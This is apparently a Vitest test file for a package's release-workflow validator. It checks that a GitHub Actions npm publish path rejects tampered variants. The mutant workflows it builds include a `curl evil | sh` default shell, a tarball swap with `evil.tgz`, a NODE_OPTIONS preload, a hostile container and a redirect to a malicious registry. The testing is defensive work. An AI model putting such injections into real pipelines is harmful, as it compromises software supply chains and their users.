import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { validateReleaseWorkflow } from '../scripts/check-release-workflow.js';
import { validateReleaseContext } from '../scripts/prepare-release.js';

const read = (path) => readFileSync(fileURLToPath(new URL('../' + path, import.meta.url)), 'utf8');
const workflow = read('.github/workflows/release.yml');
const pkg = JSON.parse(read('package.json'));
const policy = read('docs/releasing.md');
const tag = pkg.name + '@' + pkg.version;
const context = {
	GITHUB_EVENT_NAME: 'push',
	GITHUB_REF_TYPE: 'tag',
	GITHUB_REF_NAME: tag,
	GITHUB_REF: 'refs/tags/' + tag,
	GITHUB_REPOSITORY: 'lanteanio/svelte-adapter-uws',
	GITHUB_SHA: 'a'.repeat(40)
};
const git = {
	tagType: 'tag',
	tagCommit: 'b'.repeat(40),
	// The event SHA of an annotated tag push is the tag OBJECT, not the
	// commit it points at; the validator binds GITHUB_SHA to one of the two.
	tagObject: 'a'.repeat(40),
	head: 'b'.repeat(40),
	clean: true,
	sourceBranch: 'origin/dev',
	sourceContainsHead: true
};

describe('trusted release workflow', () => {
	it('is a closed tag-only OIDC path for one retained tarball', () => {
		expect(validateReleaseWorkflow(workflow, pkg, policy)).toEqual([]);
	});

	it('rejects trigger, permission, token, and source-publication widening', () => {
		const mutants = [
			workflow.replace("tags:\n      - 'svelte-adapter-uws@*'", 'branches: [main]'),
			workflow.replace('id-token: write', 'id-token: read'),
			workflow.replace('npm publish "', 'NODE_AUTH_TOKEN: secret\n        run: npm publish "'),
			workflow.replace('${{ steps.pack.outputs.tarball }}', '.')
		];
		for (const mutant of mutants) {
			expect(validateReleaseWorkflow(mutant, pkg, policy).length).toBeGreaterThan(0);
		}
	});

	it('rejects action-tag drift and artifact-output laundering', () => {
		const floating = workflow.replace(
			'actions/checkout@11d5960a326750d5838078e36cf38b85af677262',
			'actions/checkout@v4'
		);
		expect(validateReleaseWorkflow(floating, pkg, policy).length).toBeGreaterThan(0);
		const laundered = workflow.replace(
			"'tarball=' + $tarball >> $env:GITHUB_OUTPUT",
			"'tarball=package.json' >> $env:GITHUB_OUTPUT"
		);
		expect(validateReleaseWorkflow(laundered, pkg, policy).length).toBeGreaterThan(0);

		// An INTERIOR line added to the pack body - no new step, no renamed
		// step - swaps the tarball bytes after the checks ran. The body is
		// exact-matched, so the injection must fail even though every required
		// token is still present.
		const injected = workflow.replace(
			"'tarball=' + $tarball >> $env:GITHUB_OUTPUT",
			"Copy-Item evil.tgz $tarball -Force\n          'tarball=' + $tarball >> $env:GITHUB_OUTPUT"
		);
		expect(injected).not.toBe(workflow);
		expect(validateReleaseWorkflow(injected, pkg, policy).join('\n'))
			.toContain('retained artifact pack body is not exact');
	});

	it('rejects step-level keys that neutralize a step without touching name, order, or body', () => {
		// continue-on-error makes the identity verifier ADVISORY: it runs,
		// refuses, and the job publishes anyway. The load-bearing case.
		const advisory = workflow.replace(
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        continue-on-error: true\n        run: node scripts/prepare-release.js'
		);
		expect(advisory).not.toBe(workflow);
		expect(validateReleaseWorkflow(advisory, pkg, policy).join('\n'))
			.toContain('disallowed keys: continue-on-error');

		const skipped = workflow.replace(
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        if: ${{ false }}\n        run: node scripts/prepare-release.js'
		);
		expect(skipped).not.toBe(workflow);
		expect(validateReleaseWorkflow(skipped, pkg, policy).join('\n'))
			.toContain('disallowed keys: if');

		const preloaded = workflow.replace(
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        env:\n          NODE_OPTIONS: --require ./scripts/postinstall.js\n        run: node scripts/prepare-release.js'
		);
		expect(preloaded).not.toBe(workflow);
		expect(validateReleaseWorkflow(preloaded, pkg, policy).join('\n'))
			.toContain('disallowed keys: env');
	});

	it('rejects job-level and workflow-level laundering keys the step inventory cannot see', () => {
		// A job-level env is inherited by EVERY exact-matched run command -
		// the step-level attack moved one indent up. The lead case.
		const jobEnv = workflow.replace(
			'    timeout-minutes: 90',
			'    timeout-minutes: 90\n    env:\n      NODE_OPTIONS: --require ./scripts/postinstall.js'
		);
		expect(jobEnv).not.toBe(workflow);
		expect(validateReleaseWorkflow(jobEnv, pkg, policy).join('\n'))
			.toContain('release job carries disallowed keys: env');

		const jobShell = workflow.replace(
			'    timeout-minutes: 90',
			'    timeout-minutes: 90\n    defaults:\n      run:\n        shell: bash -c "curl evil | sh; {0}"'
		);
		expect(jobShell).not.toBe(workflow);
		expect(validateReleaseWorkflow(jobShell, pkg, policy).join('\n'))
			.toContain('release job carries disallowed keys: defaults');

		const jobContainer = workflow.replace(
			'    timeout-minutes: 90',
			'    timeout-minutes: 90\n    container: evil/image:latest'
		);
		expect(jobContainer).not.toBe(workflow);
		expect(validateReleaseWorkflow(jobContainer, pkg, policy).join('\n'))
			.toContain('release job carries disallowed keys: container');

		const workflowEnv = workflow.replace(
			'permissions:\n  contents: read',
			'permissions:\n  contents: read\nenv:\n  npm_config_registry: https://evil.example'
		);
		expect(workflowEnv).not.toBe(workflow);
		expect(validateReleaseWorkflow(workflowEnv, pkg, policy).join('\n'))
			.toContain('release workflow carries disallowed keys: env');
	});

	it('rejects an interposed step, a duplicated step name, and verify-before-install', () => {
		// An extra run step between pack and publish is exactly where an
		// artifact swap would live; the checker holds a closed, ordered
		// step inventory rather than a name-keyed set.
		const interposed = workflow.replace(
			'      - name: Publish exact tarball to quarantine with trusted OIDC',
			'      - name: Innocuous cleanup\n        run: echo done\n\n      - name: Publish exact tarball to quarantine with trusted OIDC'
		);
		expect(interposed).not.toBe(workflow);
		expect(validateReleaseWorkflow(interposed, pkg, policy).join('\n')).toContain('exactly, in order');

		const duplicated = workflow.replace(
			'      - name: Install OIDC-capable npm\n        run: npm install --global npm@11.5.1',
			'      - name: Install OIDC-capable npm\n        run: echo shadowed\n\n      - name: Install OIDC-capable npm\n        run: npm install --global npm@11.5.1'
		);
		expect(duplicated).not.toBe(workflow);
		expect(validateReleaseWorkflow(duplicated, pkg, policy).join('\n')).toContain('unique');

		// The verifier imports installed dependencies at module load, so it
		// must run after npm ci - the previous order killed every tag push.
		const verifyFirst = workflow.replace(
			'      - name: Install locked root dependencies\n        run: npm ci\n\n      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js\n\n      - name: Install locked root dependencies\n        run: npm ci'
		);
		expect(verifyFirst).not.toBe(workflow);
		expect(validateReleaseWorkflow(verifyFirst, pkg, policy).join('\n')).toContain('exactly, in order');
	});
});

describe('release source identity', () => {
	it('accepts only the canonical annotated version tag on a clean exact commit', () => {
		expect(validateReleaseContext(context, pkg, git)).toEqual([]);
	});

	it('binds the event revision to the checkout', () => {
		// An event SHA matching neither the tag object nor the checked-out
		// HEAD means the run would publish different bytes than the push.
		expect(validateReleaseContext(
			{ ...context, GITHUB_SHA: 'd'.repeat(40) },
			pkg,
			git
		)).toContain('release event SHA is bound to neither the checked-out HEAD nor the annotated tag object');
		// Either identity is acceptable: the tag object (annotated tag push)
		// or the commit itself.
		expect(validateReleaseContext(
			{ ...context, GITHUB_SHA: 'b'.repeat(40) },
			pkg,
			git
		)).toEqual([]);
	});

	it('runs the release verifier as a real process and gets a diagnosable refusal, not a module crash', async () => {
		// The publication path once died with ERR_MODULE_NOT_FOUND before any
		// check ran, because the workflow invoked this script before npm ci.
		// Spawning it for real proves the module graph loads from a checkout
		// with dependencies installed and that a context mismatch surfaces as
		// the validator's own message.
		const { spawnSync } = await import('node:child_process');
		const result = spawnSync(process.execPath, ['scripts/prepare-release.js'], {
			cwd: fileURLToPath(new URL('..', import.meta.url)),
			encoding: 'utf8',
			windowsHide: true,
			env: { ...process.env, GITHUB_EVENT_NAME: 'pull_request', GITHUB_REF: '', GITHUB_REF_TYPE: '', GITHUB_REF_NAME: '', GITHUB_SHA: '' }
		});
		expect(result.error).toBeUndefined();
		expect(result.status).not.toBe(0);
		const output = (result.stderr || '') + (result.stdout || '');
		expect(output).toContain('release event must be push');
		expect(output).not.toContain('ERR_MODULE_NOT_FOUND');
	}, 30_000);

	it('rejects a branch, retagged package version, lightweight tag, dirty tree, or wrong commit', () => {
		const cases = [
			[{ ...context, GITHUB_REF_TYPE: 'branch' }, git],
			[{ ...context, GITHUB_REF_NAME: pkg.name + '@0.0.0' }, git],
			[context, { ...git, tagType: 'commit' }],
			[context, { ...git, clean: false }],
			[context, { ...git, tagCommit: 'c'.repeat(40) }],
			[context, { ...git, sourceContainsHead: false }],
			[context, { ...git, sourceBranch: 'origin/main' }]
		];
		for (const [env, details] of cases) {
			expect(validateReleaseContext(env, pkg, details).length).toBeGreaterThan(0);
		}
	});
});
